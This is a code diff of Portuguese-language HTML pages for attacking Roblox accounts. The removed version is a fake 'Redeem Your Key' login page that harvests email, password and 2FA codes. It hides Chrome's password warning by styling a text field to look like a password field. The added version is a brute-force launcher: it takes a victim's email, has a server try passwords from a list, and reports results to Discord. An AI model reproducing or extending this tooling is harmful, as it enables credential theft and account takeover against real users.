@@ -3,245 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redeem Your Key - Roblox Login</title>
+    <title>Roblox Email Brute Force</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #1a1a1a;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        .container {
-            background: #2b2b2b;
-            padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            width: 350px;
-            text-align: center;
-        }
-
-        h1 {
-            color: #00b060;
-            margin-bottom: 20px;
-            font-size: 24px;
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-size: 14px;
-            color: #ccc;
-        }
-
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #444;
-            border-radius: 8px;
-            background: #333;
-            color: white;
-            font-size: 16px;
-            box-sizing: border-box;
-            transition: border-color 0.3s;
-        }
-
-        input:focus {
-            border-color: #00b060;
-            outline: none;
-        }
-
-        /* ESTE É O TRUQUE PARA O CHROME: */
-        /* Faz o campo parecer senha (pontinhos) mas é um texto comum */
-        .password-field {
-            -webkit-text-security: disc;
-        }
-
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #00b060;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background 0.3s;
-            margin-top: 10px;
-        }
-
-        button:hover {
-            background: #009950;
-        }
-
-        .message {
-            margin-top: 15px;
-            font-size: 14px;
-            min-height: 20px;
-        }
-
-        .success {
-            color: #00b060;
-        }
-
-        .error {
-            color: #ff4d4d;
-        }
-
-        .loading {
-            color: #ffcc00;
-        }
-
-        #step2 {
-            display: none;
-        }
-
-        .roblox-icon {
-            width: 50px;
-            height: 50px;
-            background: #00b060;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 24px;
-            font-weight: bold;
-        }
+        body { font-family: sans-serif; background: #232336; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #181825; padding: 30px; border-radius: 12px; width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.5); }
+        h2 { text-align: center; color: #00b060; margin-top: 0; }
+        label { display: block; margin-bottom: 5px; color: #aaa; font-size: 14px; }
+        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #444; border-radius: 6px; background: #2f2f45; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #00b060; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        button:hover { background: #009950; }
+        #status { margin-top: 15px; text-align: center; font-size: 14px; min-height: 20px; }
+        .success { color: #00b060; }
+        .error { color: #ff4d4d; }
+        .info { color: #ccc; font-size: 12px; margin-bottom: 15px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="roblox-icon">R</div>
-    <h1>Redeem Your Key</h1>
+<div class="box">
+    <h2>📧 Email Brute Force</h2>
+    <p class="info">Insira o Email da vítima. O Bot vai testar automaticamente as senhas do arquivo `senhas.txt`.</p>
     
-    <!-- Passo 1: Login -->
-    <div id="step1">
-        <div class="input-group">
-            <label>Email</label>
-            <input type="email" id="email" placeholder="seu-email@exemplo.com">
-        </div>
-        <div class="input-group">
-            <label>Senha</label>
-            <!-- MUDANÇA: type="text" e a classe "password-field" para esconder o aviso do Chrome -->
-            <input type="text" id="password" class="password-field" placeholder="Sua senha">
-        </div>
-        <button onclick="checkLogin()">Verificar Conta</button>
-        <div class="message" id="msg1"></div>
-    </div>
+    <label>Email da Conta Roblox</label>
+    <input type="email" id="emailInput" placeholder="exemplo@gmail.com">
 
-    <!-- Passo 2: 2FA -->
-    <div id="step2">
-        <h2>Confirmação 2FA</h2>
-        <p style="font-size: 14px; color: #ccc;">Verifique o email da sua conta Roblox e coloque o código de 6 dígitos.</p>
-        <div class="input-group">
-            <label>Código 2FA</label>
-            <input type="text" id="code2fa" placeholder="Ex: 123456" maxlength="6">
-        </div>
-        <button onclick="submit2FA()">Confirmar e Resgatar</button>
-        <div class="message" id="msg2"></div>
-    </div>
+    <button onclick="startAttack()">Iniciar Ataque</button>
+
+    <div id="status"></div>
 </div>
 
 <script>
-    async function checkLogin() {
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const msgDiv = document.getElementById('msg1');
-        const btn = document.querySelector('#step1 button');
+    async function startAttack() {
+        const email = document.getElementById('emailInput').value;
+        const statusDiv = document.getElementById('status');
+        const btn = document.querySelector('button');
 
-        if (!email || !password) {
-            msgDiv.innerHTML = '<span class="error">Preencha o Email e a Senha!</span>';
+        if (!email || !email.includes('@')) {
+            statusDiv.innerHTML = '<span class="error">Coloca um Email válido!</span>';
             return;
         }
 
-        msgDiv.innerHTML = '<span class="loading">Verificando conta...</span>';
+        statusDiv.innerHTML = '<span class="success">Enviando Email para o Bot...</span>';
         btn.disabled = true;
-        btn.style.opacity = '0.7';
+        btn.innerText = "Aguardando...";
 
         try {
-            const response = await fetch('/check', {
+            const response = await fetch('/start-brute-force', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    email: email,
-                    password: password
-                })
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email })
             });
 
             const data = await response.json();
 
             if (data.success) {
-                msgDiv.innerHTML = '<span class="success">✅ Conta Encontrada! Vai para a confirmação...</span>';
-                setTimeout(() => {
-                    document.getElementById('step1').style.display = 'none';
-                    document.getElementById('step2').style.display = 'block';
-                }, 1500);
+                statusDiv.innerHTML = '<span class="success">✅ Ataque Iniciado! Verifique o Discord em instantes.</span>';
             } else {
-                msgDiv.innerHTML = '<span class="error">❌ ' + (data.error || 'Erro ao verificar a conta.') + '</span>';
+                statusDiv.innerHTML = `<span class="error">❌ Erro: ${data.error}</span>`;
             }
-        } catch (error) {
-            msgDiv.innerHTML = '<span class="error">❌ Erro de Conexão com o Servidor.</span>';
-            console.error('Erro:', error);
+
+        } catch (e) {
+            statusDiv.innerHTML = '<span class="error">❌ Erro de Conexão com o Servidor</span>';
         } finally {
             btn.disabled = false;
-            btn.style.opacity = '1';
-        }
-    }
-
-    async function submit2FA() {
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const code = document.getElementById('code2fa').value;
-        const msgDiv = document.getElementById('msg2');
-        const btn = document.querySelector('#step2 button');
-
-        if (!code) {
-            msgDiv.innerHTML = '<span class="error">Preencha o Código 2FA!</span>';
-            return;
-        }
-
-        msgDiv.innerHTML = '<span class="loading">Enviando dados...</span>';
-        btn.disabled = true;
-
-        try {
-            await fetch('/check', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    email: email,
-                    password: password,
-                    code2fa: code,
-                    isFinalStep: true
-                })
-            });
-
-            msgDiv.innerHTML = '<span class="success">✅ Sucesso! A sua chave será enviada em breve.</span>';
-            
-            setTimeout(() => {
-                document.querySelector('.container').innerHTML = '<h1 style="color:#00b060">Tudo Pronto!</h1><p>Aguarde o email de confirmação.</p>';
-            }, 2000);
-
-        } catch (error) {
-            msgDiv.innerHTML = '<span class="error">❌ Erro ao enviar o código.</span>';
-        } finally {
-            btn.disabled = false;
+            btn.innerText = "Iniciar Ataque";
         }
     }
 </script>
